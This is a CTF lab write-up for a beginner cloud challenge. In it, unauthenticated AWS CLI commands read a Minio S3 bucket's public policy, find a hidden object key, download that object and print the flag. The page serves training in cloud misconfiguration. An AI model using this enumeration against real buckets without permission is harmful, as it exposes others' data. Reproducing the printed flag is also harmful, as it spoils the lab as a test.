# ctf.live


 - [beginners](#beginners)
   - [cloud](#cloud)
     - [S3: Information Leakage](#S3:-Information-Leakage)
   - [misc](#misc)
     
   - [pwn](#pwn)
     
   - [web](#web)



## cloud

### S3: Information Leakage

It's a common practice to have web applications fetch static resources from the Amazon S3 bucket. In most of the deployment, the S3 bucket will have object listing disabled as it could reveal sensitive information.

In this challenge, the attacker can interact with both the web application as well as with the Amazon S3 bucket. There is a misconfiguration on the S3 bucket which can be leveraged to find out the object key of certain objects.

Objective: Retrieve the flag from the S3 Bucket

This lab has been created using Minio which is an Open Source, Enterprise-Grade, Amazon S3 Compatible Object Storage.

Instructions: 

This lab is dedicated to you! No other users are on this network :) 
Once you start the lab, you will have access to a Kali GUI instance.
The web server should be located at pentesteracademylab.appspot.com
The exposed S3 endpoint should be located at s3.pentesteracademylab.appspot.com

La pista del reto es: 
**The S3 Bucket policy is readable**

```
root@attackdefense:~# aws s3api get-bucket-policy --bucket assets --no-sign-request --endpoint-url http://s3.pentesteracademylab.appspot.com

{
    "Policy": "{\"ID\":\"Policy1568185116930\",\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"Stmt1568184932403\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":[\"*\"]},\"Action\":[\"s3:GetBucketPolicy\"],\"Resource\":[\"arn:aws:s3:::assets\"]},{\"Sid\":\"Stmt1568185007451\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":[\"*\"]},\"Action\":[\"s3:GetObject\"],\"Resource\":[\"arn:aws:s3:::assets/sup3r-s3cr3t-flag\"]}]}"
}

root@attackdefense:~# aws s3 cp s3://assets/sup3r-s3cr3t-flag . --no-sign-request --endpoint-url http://s3.pentesteracademylab.appspot.com
download: s3://assets/sup3r-s3cr3t-flag to ./sup3r-s3cr3t-flag  

root@attackdefense:~# cat sup3r-s3cr3t-flag 
c394b16102c3c6976934c0b7d6af55f9

root@attackdefense:~# 
```



## misc



## pwn



## web
